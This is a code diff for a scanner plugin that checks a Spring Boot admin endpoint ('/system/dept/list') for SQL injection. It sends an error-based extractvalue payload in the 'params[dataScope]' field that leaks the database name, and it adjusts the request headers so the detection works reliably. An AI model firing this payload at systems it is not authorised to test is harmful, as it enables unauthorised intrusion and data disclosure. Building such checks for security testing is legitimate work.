@@ -2,7 +2,7 @@
 from plugins.base import PluginBase
 from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
 from lib.colors import ok, no
-from lib.http import host_of
+from lib.http import host_of, join_url
 
 
 class SqlInjectDeptPlugin(PluginBase):
@@ -24,20 +24,24 @@ class SqlInjectDeptPlugin(PluginBase):
             "Sec-Fetch-Site": "none",
             "Upgrade-Insecure-Requests": "1",
             "sec-ch-ua": "Chromium;v=122, Not(A:Brand;v=24, Google Chrome;v=122",
-            "Connection": "keep-alive",
+            # 关键：使用 close 而非 keep-alive。SessionManager 复用 keep-alive 连接时，
+            # 该请求在复用连接上偶发返回 500 空响应体，导致 database() 判定失败（false negative）。
+            "Connection": "close",
             "Sec-Fetch-Dest": "document",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
             "Cookie": "",
             "sec-ch-ua-mobile": "?0",
             "Sec-Fetch-User": "?1",
             "sec-ch-ua-platform": "Windows",
-            "Accept": "text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Content-Length": "0"
+            # 关键：必须是 application/json 而非 text/html。SQL 报错时若 Accept 为 text/html，
+            # Spring Boot 会尝试渲染 HTML 错误视图而失败（返回 500 空响应体），导致 database()
+            # 判定失效（false negative）。application/json 让错误以 JSON 返回并含 database() 特征。
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Encoding": "gzip, deflate, br"
         }
         # 原 data 1:1 保留（含 extractvalue payload，注意此处的空格差异与原脚本一致）
         data = {"params[dataScope]": "and extractvalue(1, concat(0x7e,(select database()),0x7e))"}
-        url = target + '/system/dept/list'
+        url = join_url(target, '/system/dept/list')
         try:
             resp = session.post(url, headers=headers, data=data)
             sql_inject = resp.text
